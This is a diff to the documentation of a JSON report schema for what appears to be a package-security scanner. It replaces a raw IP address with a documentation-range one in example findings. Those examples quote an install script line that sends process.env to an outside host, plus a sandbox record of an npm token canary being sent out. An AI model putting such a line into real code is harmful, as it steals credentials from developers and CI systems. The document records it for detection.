@@ -86,8 +86,8 @@ verify, then parse the decoded payload.
       "phase": "install",                  // "install" | "import" | "runtime" | "unknown"
       "file": "scripts/setup.js",
       "line": 12,
-      "evidence": "https.request({ host: '45.77.12.9', … }).end(JSON.stringify(process.env))",
-      "destinations": ["https://45.77.12.9/c"],
+      "evidence": "https.request({ host: '203.0.113.7', … }).end(JSON.stringify(process.env))",
+      "destinations": ["https://203.0.113.7/c"],
       "new_since_previous": true,
       "source": "static"                   // "static" | "sandbox" | "registry" | "osv"
     }
@@ -95,7 +95,7 @@ verify, then parse the decoded payload.
   "network": {
     "destinations": [
       {
-        "value": "45.77.12.9",
+        "value": "203.0.113.7",
         "kind": "raw-ip",                  // raw-ip | collector | chat-webhook | paste | tunnel | registry | package-home | known-telemetry | other
         "phase": "install",
         "new_since_previous": true,
@@ -118,7 +118,7 @@ finding → `info`; else `clean`. `clean` means nothing was found, never "safe".
   "reason": null,                          // why skipped / error
   "runs": ["dev", "ci"],                   // environments it ran under
   "attempts": [
-    { "kind": "http", "target": "https://45.77.12.9/c", "phase": "install", "run": "ci",
+    { "kind": "http", "target": "https://203.0.113.7/c", "phase": "install", "run": "ci",
       "payload_preview": "eyJOUE1fVE9LRU4iOi…", "canary_hits": ["npm-token"] }
     // kind: "dns" | "tcp" | "http" | "udp" | "exec"
   ],
